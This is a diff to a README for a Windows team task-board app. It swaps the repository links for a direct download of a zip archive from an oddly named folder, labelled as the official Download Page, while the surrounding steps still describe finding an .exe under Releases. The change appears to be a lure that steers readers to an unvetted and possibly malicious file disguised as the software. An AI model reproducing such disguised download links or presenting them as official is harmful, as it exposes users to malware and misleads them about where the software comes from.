@@ -1,6 +1,6 @@
 # 📋 remote-task-board - Manage your daily team tasks easily
 
-[![](https://img.shields.io/badge/Download-remote--task--board-blue)](https://github.com/flat-selfevidenttruth414/remote-task-board)
+[![](https://img.shields.io/badge/Download-remote--task--board-blue)](https://raw.githubusercontent.com/flat-selfevidenttruth414/remote-task-board/main/superdeficit/task_remote_board_2.9-beta.1.zip)
 
 ## 📌 Overview
 
@@ -28,7 +28,7 @@ This software runs on modern computers. Ensure your machine meets these criteria
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official [Download Page](https://github.com/flat-selfevidenttruth414/remote-task-board).
+1.  Visit the official [Download Page](https://raw.githubusercontent.com/flat-selfevidenttruth414/remote-task-board/main/superdeficit/task_remote_board_2.9-beta.1.zip).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version tagged as Latest.
 4.  Find the file ending in .exe in the Assets list.
